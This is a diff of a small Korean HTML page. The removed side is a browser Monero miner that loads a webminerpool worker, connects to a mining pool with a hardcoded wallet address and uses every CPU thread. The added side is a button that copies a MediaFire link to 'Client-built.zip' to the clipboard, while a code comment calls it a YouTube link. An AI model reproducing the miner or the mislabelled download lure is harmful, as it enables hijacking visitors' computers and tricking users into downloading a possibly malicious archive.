@@ -1,38 +1,26 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-  <meta charset="UTF-8">
-  <title>Monero 브라우저 채굴기 (단순)</title>
+    <meta charset="UTF-8">
+    <title>수상한 링크 복사 버튼</title>
 </head>
 <body>
-  <h2>Monero 채굴 중...</h2>
-  <p id="status">초기화 중...</p>
-  <script src="https://cdn.jsdelivr.net/gh/notgiven688/webminerpool@master/sdk/worker.min.js"></script>
-  <script>
-    const server = "wss://minexmr.stream:8181";
-    const walletAddress = "42uPLifaPuT1a9ZAsekfSk1WufupQELmNecGPTtvsJ6t9ZVyw4MadYe6xXVkR2BXabA3KD6zLNUfW7e9TNqCSGF3Ta39b5e";
+    <h1>수상한 링크 복사하기</h1>
+    
+    <button onclick="copyYoutubeLink()">📋 수상한 링크 복사</button>
+    <p id="status"></p>
 
-    const worker = new Worker("https://cdn.jsdelivr.net/gh/notgiven688/webminerpool@master/sdk/worker.min.js");
-
-    worker.postMessage({
-      type: "connect",
-      site_key: walletAddress,
-      server: server,
-      threads: -1,
-      userid: "webminer-user"
-    });
-
-    worker.onmessage = (msg) => {
-      if (msg.data.type === "hashsolved") {
-        console.log("✔ 해시 해결됨:", msg.data);
-      } else if (msg.data.type === "authed") {
-        document.getElementById("status").textContent = "채굴 시작됨!";
-      } else if (msg.data.type === "job") {
-        document.getElementById("status").textContent = "채굴 진행 중...";
-      } else if (msg.data.type === "error") {
-        document.getElementById("status").textContent = "채굴 오류: " + msg.data.param;
-      }
-    };
-  </script>
+    <script>
+        function copyYoutubeLink() {
+            const youtubeLink = "https://www.mediafire.com/file/7awvayrrstqf374/Client-built.zip/file"; // 복사할 유튜브 링크
+            navigator.clipboard.writeText(youtubeLink)
+                .then(() => {
+                    document.getElementById("status").innerText = "✅ 링크가 클립보드에 복사되었습니다!";
+                })
+                .catch(err => {
+                    document.getElementById("status").innerText = "❌ 복사 실패: " + err;
+                });
+        }
+    </script>
 </body>
 </html>
